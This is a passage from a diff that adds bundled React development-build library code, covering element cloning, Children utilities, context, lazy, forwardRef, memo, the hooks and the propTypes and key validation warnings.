+                if (hasOwnProperty.call(config, propName) && !RESERVED_PROPS.hasOwnProperty(propName)) {
+                  if (config[propName] === void 0 && defaultProps !== void 0) {
+                    props[propName] = defaultProps[propName];
+                  } else {
+                    props[propName] = config[propName];
+                  }
+                }
+              }
+            }
+            var childrenLength = arguments.length - 2;
+            if (childrenLength === 1) {
+              props.children = children;
+            } else if (childrenLength > 1) {
+              var childArray = Array(childrenLength);
+              for (var i = 0; i < childrenLength; i++) {
+                childArray[i] = arguments[i + 2];
+              }
+              props.children = childArray;
+            }
+            return ReactElement2(element.type, key, ref, self2, source, owner, props);
+          }
+          function isValidElement(object) {
+            return typeof object === "object" && object !== null && object.$$typeof === REACT_ELEMENT_TYPE;
+          }
+          var SEPARATOR = ".";
+          var SUBSEPARATOR = ":";
+          function escape(key) {
+            var escapeRegex = /[=:]/g;
+            var escaperLookup = {
+              "=": "=0",
+              ":": "=2"
+            };
+            var escapedString = key.replace(escapeRegex, function(match) {
+              return escaperLookup[match];
+            });
+            return "$" + escapedString;
+          }
+          var didWarnAboutMaps = false;
+          var userProvidedKeyEscapeRegex = /\/+/g;
+          function escapeUserProvidedKey(text) {
+            return text.replace(userProvidedKeyEscapeRegex, "$&/");
+          }
+          function getElementKey(element, index) {
+            if (typeof element === "object" && element !== null && element.key != null) {
+              {
+                checkKeyStringCoercion(element.key);
+              }
+              return escape("" + element.key);
+            }
+            return index.toString(36);
+          }
+          function mapIntoArray(children, array, escapedPrefix, nameSoFar, callback) {
+            var type = typeof children;
+            if (type === "undefined" || type === "boolean") {
+              children = null;
+            }
+            var invokeCallback = false;
+            if (children === null) {
+              invokeCallback = true;
+            } else {
+              switch (type) {
+                case "string":
+                case "number":
+                  invokeCallback = true;
+                  break;
+                case "object":
+                  switch (children.$$typeof) {
+                    case REACT_ELEMENT_TYPE:
+                    case REACT_PORTAL_TYPE:
+                      invokeCallback = true;
+                  }
+              }
+            }
+            if (invokeCallback) {
+              var _child = children;
+              var mappedChild = callback(_child);
+              var childKey = nameSoFar === "" ? SEPARATOR + getElementKey(_child, 0) : nameSoFar;
+              if (isArray(mappedChild)) {
+                var escapedChildKey = "";
+                if (childKey != null) {
+                  escapedChildKey = escapeUserProvidedKey(childKey) + "/";
+                }
+                mapIntoArray(mappedChild, array, escapedChildKey, "", function(c) {
+                  return c;
+                });
+              } else if (mappedChild != null) {
+                if (isValidElement(mappedChild)) {
+                  {
+                    if (mappedChild.key && (!_child || _child.key !== mappedChild.key)) {
+                      checkKeyStringCoercion(mappedChild.key);
+                    }
+                  }
+                  mappedChild = cloneAndReplaceKey(
+                    mappedChild,
+                    // Keep both the (mapped) and old keys if they differ, just as
+                    // traverseAllChildren used to do for objects as children
+                    escapedPrefix + // $FlowFixMe Flow incorrectly thinks React.Portal doesn't have a key
+                    (mappedChild.key && (!_child || _child.key !== mappedChild.key) ? (
+                      // $FlowFixMe Flow incorrectly thinks existing element's key can be a number
+                      // eslint-disable-next-line react-internal/safe-string-coercion
+                      escapeUserProvidedKey("" + mappedChild.key) + "/"
+                    ) : "") + childKey
+                  );
+                }
+                array.push(mappedChild);
+              }
+              return 1;
+            }
+            var child;
+            var nextName;
+            var subtreeCount = 0;
+            var nextNamePrefix = nameSoFar === "" ? SEPARATOR : nameSoFar + SUBSEPARATOR;
+            if (isArray(children)) {
+              for (var i = 0; i < children.length; i++) {
+                child = children[i];
+                nextName = nextNamePrefix + getElementKey(child, i);
+                subtreeCount += mapIntoArray(child, array, escapedPrefix, nextName, callback);
+              }
+            } else {
+              var iteratorFn = getIteratorFn(children);
+              if (typeof iteratorFn === "function") {
+                var iterableChildren = children;
+                {
+                  if (iteratorFn === iterableChildren.entries) {
+                    if (!didWarnAboutMaps) {
+                      warn("Using Maps as children is not supported. Use an array of keyed ReactElements instead.");
+                    }
+                    didWarnAboutMaps = true;
+                  }
+                }
+                var iterator = iteratorFn.call(iterableChildren);
+                var step;
+                var ii = 0;
+                while (!(step = iterator.next()).done) {
+                  child = step.value;
+                  nextName = nextNamePrefix + getElementKey(child, ii++);
+                  subtreeCount += mapIntoArray(child, array, escapedPrefix, nextName, callback);
+                }
+              } else if (type === "object") {
+                var childrenString = String(children);
+                throw new Error("Objects are not valid as a React child (found: " + (childrenString === "[object Object]" ? "object with keys {" + Object.keys(children).join(", ") + "}" : childrenString) + "). If you meant to render a collection of children, use an array instead.");
+              }
+            }
+            return subtreeCount;
+          }
+          function mapChildren(children, func, context) {
+            if (children == null) {
+              return children;
+            }
+            var result = [];
+            var count = 0;
+            mapIntoArray(children, result, "", "", function(child) {
+              return func.call(context, child, count++);
+            });
+            return result;
+          }
+          function countChildren(children) {
+            var n = 0;
+            mapChildren(children, function() {
+              n++;
+            });
+            return n;
+          }
+          function forEachChildren(children, forEachFunc, forEachContext) {
+            mapChildren(children, function() {
+              forEachFunc.apply(this, arguments);
+            }, forEachContext);
+          }
+          function toArray(children) {
+            return mapChildren(children, function(child) {
+              return child;
+            }) || [];
+          }
+          function onlyChild(children) {
+            if (!isValidElement(children)) {
+              throw new Error("React.Children.only expected to receive a single React element child.");
+            }
+            return children;
+          }
+          function createContext(defaultValue) {
+            var context = {
+              $$typeof: REACT_CONTEXT_TYPE,
+              // As a workaround to support multiple concurrent renderers, we categorize
+              // some renderers as primary and others as secondary. We only expect
+              // there to be two concurrent renderers at most: React Native (primary) and
+              // Fabric (secondary); React DOM (primary) and React ART (secondary).
+              // Secondary renderers store their context values on separate fields.
+              _currentValue: defaultValue,
+              _currentValue2: defaultValue,
+              // Used to track how many concurrent renderers this context currently
+              // supports within in a single renderer. Such as parallel server rendering.
+              _threadCount: 0,
+              // These are circular
+              Provider: null,
+              Consumer: null,
+              // Add these to use same hidden class in VM as ServerContext
+              _defaultValue: null,
+              _globalName: null
+            };
+            context.Provider = {
+              $$typeof: REACT_PROVIDER_TYPE,
+              _context: context
+            };
+            var hasWarnedAboutUsingNestedContextConsumers = false;
+            var hasWarnedAboutUsingConsumerProvider = false;
+            var hasWarnedAboutDisplayNameOnConsumer = false;
+            {
+              var Consumer = {
+                $$typeof: REACT_CONTEXT_TYPE,
+                _context: context
+              };
+              Object.defineProperties(Consumer, {
+                Provider: {
+                  get: function() {
+                    if (!hasWarnedAboutUsingConsumerProvider) {
+                      hasWarnedAboutUsingConsumerProvider = true;
+                      error("Rendering <Context.Consumer.Provider> is not supported and will be removed in a future major release. Did you mean to render <Context.Provider> instead?");
+                    }
+                    return context.Provider;
+                  },
+                  set: function(_Provider) {
+                    context.Provider = _Provider;
+                  }
+                },
+                _currentValue: {
+                  get: function() {
+                    return context._currentValue;
+                  },
+                  set: function(_currentValue) {
+                    context._currentValue = _currentValue;
+                  }
+                },
+                _currentValue2: {
+                  get: function() {
+                    return context._currentValue2;
+                  },
+                  set: function(_currentValue2) {
+                    context._currentValue2 = _currentValue2;
+                  }
+                },
+                _threadCount: {
+                  get: function() {
+                    return context._threadCount;
+                  },
+                  set: function(_threadCount) {
+                    context._threadCount = _threadCount;
+                  }
+                },
+                Consumer: {
+                  get: function() {
+                    if (!hasWarnedAboutUsingNestedContextConsumers) {
+                      hasWarnedAboutUsingNestedContextConsumers = true;
+                      error("Rendering <Context.Consumer.Consumer> is not supported and will be removed in a future major release. Did you mean to render <Context.Consumer> instead?");
+                    }
+                    return context.Consumer;
+                  }
+                },
+                displayName: {
+                  get: function() {
+                    return context.displayName;
+                  },
+                  set: function(displayName) {
+                    if (!hasWarnedAboutDisplayNameOnConsumer) {
+                      warn("Setting `displayName` on Context.Consumer has no effect. You should set it directly on the context with Context.displayName = '%s'.", displayName);
+                      hasWarnedAboutDisplayNameOnConsumer = true;
+                    }
+                  }
+                }
+              });
+              context.Consumer = Consumer;
+            }
+            {
+              context._currentRenderer = null;
+              context._currentRenderer2 = null;
+            }
+            return context;
+          }
+          var Uninitialized = -1;
+          var Pending = 0;
+          var Resolved = 1;
+          var Rejected = 2;
+          function lazyInitializer(payload) {
+            if (payload._status === Uninitialized) {
+              var ctor = payload._result;
+              var thenable = ctor();
+              thenable.then(function(moduleObject2) {
+                if (payload._status === Pending || payload._status === Uninitialized) {
+                  var resolved = payload;
+                  resolved._status = Resolved;
+                  resolved._result = moduleObject2;
+                }
+              }, function(error2) {
+                if (payload._status === Pending || payload._status === Uninitialized) {
+                  var rejected = payload;
+                  rejected._status = Rejected;
+                  rejected._result = error2;
+                }
+              });
+              if (payload._status === Uninitialized) {
+                var pending = payload;
+                pending._status = Pending;
+                pending._result = thenable;
+              }
+            }
+            if (payload._status === Resolved) {
+              var moduleObject = payload._result;
+              {
+                if (moduleObject === void 0) {
+                  error("lazy: Expected the result of a dynamic import() call. Instead received: %s\n\nYour code should look like: \n  const MyComponent = lazy(() => import('./MyComponent'))\n\nDid you accidentally put curly braces around the import?", moduleObject);
+                }
+              }
+              {
+                if (!("default" in moduleObject)) {
+                  error("lazy: Expected the result of a dynamic import() call. Instead received: %s\n\nYour code should look like: \n  const MyComponent = lazy(() => import('./MyComponent'))", moduleObject);
+                }
+              }
+              return moduleObject.default;
+            } else {
+              throw payload._result;
+            }
+          }
+          function lazy(ctor) {
+            var payload = {
+              // We use these fields to store the result.
+              _status: Uninitialized,
+              _result: ctor
+            };
+            var lazyType = {
+              $$typeof: REACT_LAZY_TYPE,
+              _payload: payload,
+              _init: lazyInitializer
+            };
+            {
+              var defaultProps;
+              var propTypes;
+              Object.defineProperties(lazyType, {
+                defaultProps: {
+                  configurable: true,
+                  get: function() {
+                    return defaultProps;
+                  },
+                  set: function(newDefaultProps) {
+                    error("React.lazy(...): It is not supported to assign `defaultProps` to a lazy component import. Either specify them where the component is defined, or create a wrapping component around it.");
+                    defaultProps = newDefaultProps;
+                    Object.defineProperty(lazyType, "defaultProps", {
+                      enumerable: true
+                    });
+                  }
+                },
+                propTypes: {
+                  configurable: true,
+                  get: function() {
+                    return propTypes;
+                  },
+                  set: function(newPropTypes) {
+                    error("React.lazy(...): It is not supported to assign `propTypes` to a lazy component import. Either specify them where the component is defined, or create a wrapping component around it.");
+                    propTypes = newPropTypes;
+                    Object.defineProperty(lazyType, "propTypes", {
+                      enumerable: true
+                    });
+                  }
+                }
+              });
+            }
+            return lazyType;
+          }
+          function forwardRef(render) {
+            {
+              if (render != null && render.$$typeof === REACT_MEMO_TYPE) {
+                error("forwardRef requires a render function but received a `memo` component. Instead of forwardRef(memo(...)), use memo(forwardRef(...)).");
+              } else if (typeof render !== "function") {
+                error("forwardRef requires a render function but was given %s.", render === null ? "null" : typeof render);
+              } else {
+                if (render.length !== 0 && render.length !== 2) {
+                  error("forwardRef render functions accept exactly two parameters: props and ref. %s", render.length === 1 ? "Did you forget to use the ref parameter?" : "Any additional parameter will be undefined.");
+                }
+              }
+              if (render != null) {
+                if (render.defaultProps != null || render.propTypes != null) {
+                  error("forwardRef render functions do not support propTypes or defaultProps. Did you accidentally pass a React component?");
+                }
+              }
+            }
+            var elementType = {
+              $$typeof: REACT_FORWARD_REF_TYPE,
+              render
+            };
+            {
+              var ownName;
+              Object.defineProperty(elementType, "displayName", {
+                enumerable: false,
+                configurable: true,
+                get: function() {
+                  return ownName;
+                },
+                set: function(name) {
+                  ownName = name;
+                  if (!render.name && !render.displayName) {
+                    render.displayName = name;
+                  }
+                }
+              });
+            }
+            return elementType;
+          }
+          var REACT_MODULE_REFERENCE;
+          {
+            REACT_MODULE_REFERENCE = Symbol.for("react.module.reference");
+          }
+          function isValidElementType(type) {
+            if (typeof type === "string" || typeof type === "function") {
+              return true;
+            }
+            if (type === REACT_FRAGMENT_TYPE || type === REACT_PROFILER_TYPE || enableDebugTracing || type === REACT_STRICT_MODE_TYPE || type === REACT_SUSPENSE_TYPE || type === REACT_SUSPENSE_LIST_TYPE || enableLegacyHidden || type === REACT_OFFSCREEN_TYPE || enableScopeAPI || enableCacheElement || enableTransitionTracing) {
+              return true;
+            }
+            if (typeof type === "object" && type !== null) {
+              if (type.$$typeof === REACT_LAZY_TYPE || type.$$typeof === REACT_MEMO_TYPE || type.$$typeof === REACT_PROVIDER_TYPE || type.$$typeof === REACT_CONTEXT_TYPE || type.$$typeof === REACT_FORWARD_REF_TYPE || // This needs to include all possible module reference object
+              // types supported by any Flight configuration anywhere since
+              // we don't know which Flight build this will end up being used
+              // with.
+              type.$$typeof === REACT_MODULE_REFERENCE || type.getModuleId !== void 0) {
+                return true;
+              }
+            }
+            return false;
+          }
+          function memo(type, compare) {
+            {
+              if (!isValidElementType(type)) {
+                error("memo: The first argument must be a component. Instead received: %s", type === null ? "null" : typeof type);
+              }
+            }
+            var elementType = {
+              $$typeof: REACT_MEMO_TYPE,
+              type,
+              compare: compare === void 0 ? null : compare
+            };
+            {
+              var ownName;
+              Object.defineProperty(elementType, "displayName", {
+                enumerable: false,
+                configurable: true,
+                get: function() {
+                  return ownName;
+                },
+                set: function(name) {
+                  ownName = name;
+                  if (!type.name && !type.displayName) {
+                    type.displayName = name;
+                  }
+                }
+              });
+            }
+            return elementType;
+          }
+          function resolveDispatcher() {
+            var dispatcher = ReactCurrentDispatcher.current;
+            {
+              if (dispatcher === null) {
+                error("Invalid hook call. Hooks can only be called inside of the body of a function component. This could happen for one of the following reasons:\n1. You might have mismatching versions of React and the renderer (such as React DOM)\n2. You might be breaking the Rules of Hooks\n3. You might have more than one copy of React in the same app\nSee https://reactjs.org/link/invalid-hook-call for tips about how to debug and fix this problem.");
+              }
+            }
+            return dispatcher;
+          }
+          function useContext(Context) {
+            var dispatcher = resolveDispatcher();
+            {
+              if (Context._context !== void 0) {
+                var realContext = Context._context;
+                if (realContext.Consumer === Context) {
+                  error("Calling useContext(Context.Consumer) is not supported, may cause bugs, and will be removed in a future major release. Did you mean to call useContext(Context) instead?");
+                } else if (realContext.Provider === Context) {
+                  error("Calling useContext(Context.Provider) is not supported. Did you mean to call useContext(Context) instead?");
+                }
+              }
+            }
+            return dispatcher.useContext(Context);
+          }
+          function useState(initialState) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useState(initialState);
+          }
+          function useReducer(reducer2, initialArg, init) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useReducer(reducer2, initialArg, init);
+          }
+          function useRef(initialValue) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useRef(initialValue);
+          }
+          function useEffect(create, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useEffect(create, deps);
+          }
+          function useInsertionEffect(create, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useInsertionEffect(create, deps);
+          }
+          function useLayoutEffect(create, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useLayoutEffect(create, deps);
+          }
+          function useCallback(callback, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useCallback(callback, deps);
+          }
+          function useMemo(create, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useMemo(create, deps);
+          }
+          function useImperativeHandle(ref, create, deps) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useImperativeHandle(ref, create, deps);
+          }
+          function useDebugValue(value, formatterFn) {
+            {
+              var dispatcher = resolveDispatcher();
+              return dispatcher.useDebugValue(value, formatterFn);
+            }
+          }
+          function useTransition() {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useTransition();
+          }
+          function useDeferredValue(value) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useDeferredValue(value);
+          }
+          function useId() {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useId();
+          }
+          function useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot) {
+            var dispatcher = resolveDispatcher();
+            return dispatcher.useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot);
+          }
+          var disabledDepth = 0;
+          var prevLog;
+          var prevInfo;
+          var prevWarn;
+          var prevError;
+          var prevGroup;
+          var prevGroupCollapsed;
+          var prevGroupEnd;
+          function disabledLog() {
+          }
+          disabledLog.__reactDisabledLog = true;
+          function disableLogs() {
+            {
+              if (disabledDepth === 0) {
+                prevLog = console.log;
+                prevInfo = console.info;
+                prevWarn = console.warn;
+                prevError = console.error;
+                prevGroup = console.group;
+                prevGroupCollapsed = console.groupCollapsed;
+                prevGroupEnd = console.groupEnd;
+                var props = {
+                  configurable: true,
+                  enumerable: true,
+                  value: disabledLog,
+                  writable: true
+                };
+                Object.defineProperties(console, {
+                  info: props,
+                  log: props,
+                  warn: props,
+                  error: props,
+                  group: props,
+                  groupCollapsed: props,
+                  groupEnd: props
+                });
+              }
+              disabledDepth++;
+            }
+          }
+          function reenableLogs() {
+            {
+              disabledDepth--;
+              if (disabledDepth === 0) {
+                var props = {
+                  configurable: true,
+                  enumerable: true,
+                  writable: true
+                };
+                Object.defineProperties(console, {
+                  log: assign({}, props, {
+                    value: prevLog
+                  }),
+                  info: assign({}, props, {
+                    value: prevInfo
+                  }),
+                  warn: assign({}, props, {
+                    value: prevWarn
+                  }),
+                  error: assign({}, props, {
+                    value: prevError
+                  }),
+                  group: assign({}, props, {
+                    value: prevGroup
+                  }),
+                  groupCollapsed: assign({}, props, {
+                    value: prevGroupCollapsed
+                  }),
+                  groupEnd: assign({}, props, {
+                    value: prevGroupEnd
+                  })
+                });
+              }
+              if (disabledDepth < 0) {
+                error("disabledDepth fell below zero. This is a bug in React. Please file an issue.");
+              }
+            }
+          }
+          var ReactCurrentDispatcher$1 = ReactSharedInternals.ReactCurrentDispatcher;
+          var prefix;
+          function describeBuiltInComponentFrame(name, source, ownerFn) {
+            {
+              if (prefix === void 0) {
+                try {
+                  throw Error();
+                } catch (x) {
+                  var match = x.stack.trim().match(/\n( *(at )?)/);
+                  prefix = match && match[1] || "";
+                }
+              }
+              return "\n" + prefix + name;
+            }
+          }
+          var reentry = false;
+          var componentFrameCache;
+          {
+            var PossiblyWeakMap = typeof WeakMap === "function" ? WeakMap : Map;
+            componentFrameCache = new PossiblyWeakMap();
+          }
+          function describeNativeComponentFrame(fn, construct) {
+            if (!fn || reentry) {
+              return "";
+            }
+            {
+              var frame = componentFrameCache.get(fn);
+              if (frame !== void 0) {
+                return frame;
+              }
+            }
+            var control;
+            reentry = true;
+            var previousPrepareStackTrace = Error.prepareStackTrace;
+            Error.prepareStackTrace = void 0;
+            var previousDispatcher;
+            {
+              previousDispatcher = ReactCurrentDispatcher$1.current;
+              ReactCurrentDispatcher$1.current = null;
+              disableLogs();
+            }
+            try {
+              if (construct) {
+                var Fake = function() {
+                  throw Error();
+                };
+                Object.defineProperty(Fake.prototype, "props", {
+                  set: function() {
+                    throw Error();
+                  }
+                });
+                if (typeof Reflect === "object" && Reflect.construct) {
+                  try {
+                    Reflect.construct(Fake, []);
+                  } catch (x) {
+                    control = x;
+                  }
+                  Reflect.construct(fn, [], Fake);
+                } else {
+                  try {
+                    Fake.call();
+                  } catch (x) {
+                    control = x;
+                  }
+                  fn.call(Fake.prototype);
+                }
+              } else {
+                try {
+                  throw Error();
+                } catch (x) {
+                  control = x;
+                }
+                fn();
+              }
+            } catch (sample) {
+              if (sample && control && typeof sample.stack === "string") {
+                var sampleLines = sample.stack.split("\n");
+                var controlLines = control.stack.split("\n");
+                var s = sampleLines.length - 1;
+                var c = controlLines.length - 1;
+                while (s >= 1 && c >= 0 && sampleLines[s] !== controlLines[c]) {
+                  c--;
+                }
+                for (; s >= 1 && c >= 0; s--, c--) {
+                  if (sampleLines[s] !== controlLines[c]) {
+                    if (s !== 1 || c !== 1) {
+                      do {
+                        s--;
+                        c--;
+                        if (c < 0 || sampleLines[s] !== controlLines[c]) {
+                          var _frame = "\n" + sampleLines[s].replace(" at new ", " at ");
+                          if (fn.displayName && _frame.includes("<anonymous>")) {
+                            _frame = _frame.replace("<anonymous>", fn.displayName);
+                          }
+                          {
+                            if (typeof fn === "function") {
+                              componentFrameCache.set(fn, _frame);
+                            }
+                          }
+                          return _frame;
+                        }
+                      } while (s >= 1 && c >= 0);
+                    }
+                    break;
+                  }
+                }
+              }
+            } finally {
+              reentry = false;
+              {
+                ReactCurrentDispatcher$1.current = previousDispatcher;
+                reenableLogs();
+              }
+              Error.prepareStackTrace = previousPrepareStackTrace;
+            }
+            var name = fn ? fn.displayName || fn.name : "";
+            var syntheticFrame = name ? describeBuiltInComponentFrame(name) : "";
+            {
+              if (typeof fn === "function") {
+                componentFrameCache.set(fn, syntheticFrame);
+              }
+            }
+            return syntheticFrame;
+          }
+          function describeFunctionComponentFrame(fn, source, ownerFn) {
+            {
+              return describeNativeComponentFrame(fn, false);
+            }
+          }
+          function shouldConstruct(Component2) {
+            var prototype = Component2.prototype;
+            return !!(prototype && prototype.isReactComponent);
+          }
+          function describeUnknownElementTypeFrameInDEV(type, source, ownerFn) {
+            if (type == null) {
+              return "";
+            }
+            if (typeof type === "function") {
+              {
+                return describeNativeComponentFrame(type, shouldConstruct(type));
+              }
+            }
+            if (typeof type === "string") {
+              return describeBuiltInComponentFrame(type);
+            }
+            switch (type) {
+              case REACT_SUSPENSE_TYPE:
+                return describeBuiltInComponentFrame("Suspense");
+              case REACT_SUSPENSE_LIST_TYPE:
+                return describeBuiltInComponentFrame("SuspenseList");
+            }
+            if (typeof type === "object") {
+              switch (type.$$typeof) {
+                case REACT_FORWARD_REF_TYPE:
+                  return describeFunctionComponentFrame(type.render);
+                case REACT_MEMO_TYPE:
+                  return describeUnknownElementTypeFrameInDEV(type.type, source, ownerFn);
+                case REACT_LAZY_TYPE: {
+                  var lazyComponent = type;
+                  var payload = lazyComponent._payload;
+                  var init = lazyComponent._init;
+                  try {
+                    return describeUnknownElementTypeFrameInDEV(init(payload), source, ownerFn);
+                  } catch (x) {
+                  }
+                }
+              }
+            }
+            return "";
+          }
+          var loggedTypeFailures = {};
+          var ReactDebugCurrentFrame$1 = ReactSharedInternals.ReactDebugCurrentFrame;
+          function setCurrentlyValidatingElement(element) {
+            {
+              if (element) {
+                var owner = element._owner;
+                var stack = describeUnknownElementTypeFrameInDEV(element.type, element._source, owner ? owner.type : null);
+                ReactDebugCurrentFrame$1.setExtraStackFrame(stack);
+              } else {
+                ReactDebugCurrentFrame$1.setExtraStackFrame(null);
+              }
+            }
+          }
+          function checkPropTypes(typeSpecs, values, location2, componentName, element) {
+            {
+              var has = Function.call.bind(hasOwnProperty);
+              for (var typeSpecName in typeSpecs) {
+                if (has(typeSpecs, typeSpecName)) {
+                  var error$1 = void 0;
+                  try {
+                    if (typeof typeSpecs[typeSpecName] !== "function") {
+                      var err = Error((componentName || "React class") + ": " + location2 + " type `" + typeSpecName + "` is invalid; it must be a function, usually from the `prop-types` package, but received `" + typeof typeSpecs[typeSpecName] + "`.This often happens because of typos such as `PropTypes.function` instead of `PropTypes.func`.");
+                      err.name = "Invariant Violation";
+                      throw err;
+                    }
+                    error$1 = typeSpecs[typeSpecName](values, typeSpecName, componentName, location2, null, "SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED");
+                  } catch (ex) {
+                    error$1 = ex;
+                  }
+                  if (error$1 && !(error$1 instanceof Error)) {
+                    setCurrentlyValidatingElement(element);
+                    error("%s: type specification of %s `%s` is invalid; the type checker function must return `null` or an `Error` but returned a %s. You may have forgotten to pass an argument to the type checker creator (arrayOf, instanceOf, objectOf, oneOf, oneOfType, and shape all require an argument).", componentName || "React class", location2, typeSpecName, typeof error$1);
+                    setCurrentlyValidatingElement(null);
+                  }
+                  if (error$1 instanceof Error && !(error$1.message in loggedTypeFailures)) {
+                    loggedTypeFailures[error$1.message] = true;
+                    setCurrentlyValidatingElement(element);
+                    error("Failed %s type: %s", location2, error$1.message);
+                    setCurrentlyValidatingElement(null);
+                  }
+                }
+              }
+            }
+          }
+          function setCurrentlyValidatingElement$1(element) {
+            {
+              if (element) {
+                var owner = element._owner;
+                var stack = describeUnknownElementTypeFrameInDEV(element.type, element._source, owner ? owner.type : null);
+                setExtraStackFrame(stack);
+              } else {
+                setExtraStackFrame(null);
+              }
+            }
+          }
+          var propTypesMisspellWarningShown;
+          {
+            propTypesMisspellWarningShown = false;
+          }
+          function getDeclarationErrorAddendum() {
+            if (ReactCurrentOwner.current) {
+              var name = getComponentNameFromType(ReactCurrentOwner.current.type);
+              if (name) {
+                return "\n\nCheck the render method of `" + name + "`.";
+              }
+            }
+            return "";
+          }
+          function getSourceInfoErrorAddendum(source) {
+            if (source !== void 0) {
+              var fileName = source.fileName.replace(/^.*[\\\/]/, "");
+              var lineNumber = source.lineNumber;
+              return "\n\nCheck your code at " + fileName + ":" + lineNumber + ".";
+            }
+            return "";
+          }
+          function getSourceInfoErrorAddendumForProps(elementProps) {
+            if (elementProps !== null && elementProps !== void 0) {
+              return getSourceInfoErrorAddendum(elementProps.__source);
+            }
+            return "";
+          }
+          var ownerHasKeyUseWarning = {};
+          function getCurrentComponentErrorInfo(parentType) {
+            var info = getDeclarationErrorAddendum();
+            if (!info) {
+              var parentName = typeof parentType === "string" ? parentType : parentType.displayName || parentType.name;
+              if (parentName) {
+                info = "\n\nCheck the top-level render call using <" + parentName + ">.";
+              }
+            }
+            return info;
+          }
+          function validateExplicitKey(element, parentType) {
+            if (!element._store || element._store.validated || element.key != null) {
+              return;
+            }
+            element._store.validated = true;
+            var currentComponentErrorInfo = getCurrentComponentErrorInfo(parentType);
+            if (ownerHasKeyUseWarning[currentComponentErrorInfo]) {
+              return;
+            }
+            ownerHasKeyUseWarning[currentComponentErrorInfo] = true;
+            var childOwner = "";
+            if (element && element._owner && element._owner !== ReactCurrentOwner.current) {
+              childOwner = " It was passed a child from " + getComponentNameFromType(element._owner.type) + ".";
+            }
+            {
+              setCurrentlyValidatingElement$1(element);
+              error('Each child in a list should have a unique "key" prop.%s%s See https://reactjs.org/link/warning-keys for more information.', currentComponentErrorInfo, childOwner);
+              setCurrentlyValidatingElement$1(null);
+            }
+          }
+          function validateChildKeys(node, parentType) {
+            if (typeof node !== "object") {
+              return;
+            }
+            if (isArray(node)) {
+              for (var i = 0; i < node.length; i++) {
+                var child = node[i];
+                if (isValidElement(child)) {
+                  validateExplicitKey(child, parentType);
+                }
+              }
+            } else if (isValidElement(node)) {
+              if (node._store) {
+                node._store.validated = true;
+              }
+            } else if (node) {
+              var iteratorFn = getIteratorFn(node);
+              if (typeof iteratorFn === "function") {
+                if (iteratorFn !== node.entries) {
+                  var iterator = iteratorFn.call(node);
+                  var step;
+                  while (!(step = iterator.next()).done) {
+                    if (isValidElement(step.value)) {
+                      validateExplicitKey(step.value, parentType);
+                    }
+                  }
+                }
+              }
+            }
+          }
+          function validatePropTypes(element) {
+            {
+              var type = element.type;
+              if (type === null || type === void 0 || typeof type === "string") {
+                return;
+              }
+              var propTypes;
+              if (typeof type === "function") {
+                propTypes = type.propTypes;
+              } else if (typeof type === "object" && (type.$$typeof === REACT_FORWARD_REF_TYPE || // Note: Memo only checks outer props here.
+              // Inner props are checked in the reconciler.
+              type.$$typeof === REACT_MEMO_TYPE)) {
+                propTypes = type.propTypes;
+              } else {
+                return;
+              }
+              if (propTypes) {
+                var name = getComponentNameFromType(type);
+                checkPropTypes(propTypes, element.props, "prop", name, element);
+              } else if (type.PropTypes !== void 0 && !propTypesMisspellWarningShown) {
+                propTypesMisspellWarningShown = true;
+                var _name = getComponentNameFromType(type);
+                error("Component %s declared `PropTypes` instead of `propTypes`. Did you misspell the property assignment?", _name || "Unknown");
+              }
+              if (typeof type.getDefaultProps === "function" && !type.getDefaultProps.isReactClassApproved) {
+                error("getDefaultProps is only used on classic React.createClass definitions. Use a static property named `defaultProps` instead.");
+              }
+            }
+          }
+          function validateFragmentProps(fragment) {
+            {
+              var keys = Object.keys(fragment.props);
+              for (var i = 0; i < keys.length; i++) {
+                var key = keys[i];
+                if (key !== "children" && key !== "key") {
+                  setCurrentlyValidatingElement$1(fragment);
+                  error("Invalid prop `%s` supplied to `React.Fragment`. React.Fragment can only have `key` and `children` props.", key);
+                  setCurrentlyValidatingElement$1(null);
+                  break;
+                }
+              }
+              if (fragment.ref !== null) {
+                setCurrentlyValidatingElement$1(fragment);
+                error("Invalid attribute `ref` supplied to `React.Fragment`.");
+                setCurrentlyValidatingElement$1(null);
+              }
+            }
+          }
+          function createElementWithValidation(type, props, children) {
+            var validType = isValidElementType(type);
+            if (!validType) {
+              var info = "";
+              if (type === void 0 || typeof type === "object" && type !== null && Object.keys(type).length === 0) {
+                info += " You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.";
+              }
+              var sourceInfo = getSourceInfoErrorAddendumForProps(props);
+              if (sourceInfo) {
+                info += sourceInfo;
+              } else {
+                info += getDeclarationErrorAddendum();
+              }
+              var typeString;
+              if (type === null) {
+                typeString = "null";
+              } else if (isArray(type)) {
+                typeString = "array";
+              } else if (type !== void 0 && type.$$typeof === REACT_ELEMENT_TYPE) {
+                typeString = "<" + (getComponentNameFromType(type.type) || "Unknown") + " />";
+                info = " Did you accidentally export a JSX literal instead of a component?";
+              } else {
+                typeString = typeof type;
+              }
+              {
+                error("React.createElement: type is invalid -- expected a string (for built-in components) or a class/function (for composite components) but got: %s.%s", typeString, info);
+              }
+            }
+            var element = createElement2.apply(this, arguments);
+            if (element == null) {
+              return element;
+            }
+            if (validType) {
+              for (var i = 2; i < arguments.length; i++) {
+                validateChildKeys(arguments[i], type);
+              }
+            }
+            if (type === REACT_FRAGMENT_TYPE) {
+              validateFragmentProps(element);
+            } else {
+              validatePropTypes(element);
+            }
+            return element;
+          }
+          var didWarnAboutDeprecatedCreateFactory = false;
+          function createFactoryWithValidation(type) {
+            var validatedFactory = createElementWithValidation.bind(null, type);
+            validatedFactory.type = type;
+            {
+              if (!didWarnAboutDeprecatedCreateFactory) {
+                didWarnAboutDeprecatedCreateFactory = true;
+                warn("React.createFactory() is deprecated and will be removed in a future major release. Consider using JSX or use React.createElement() directly instead.");
+              }
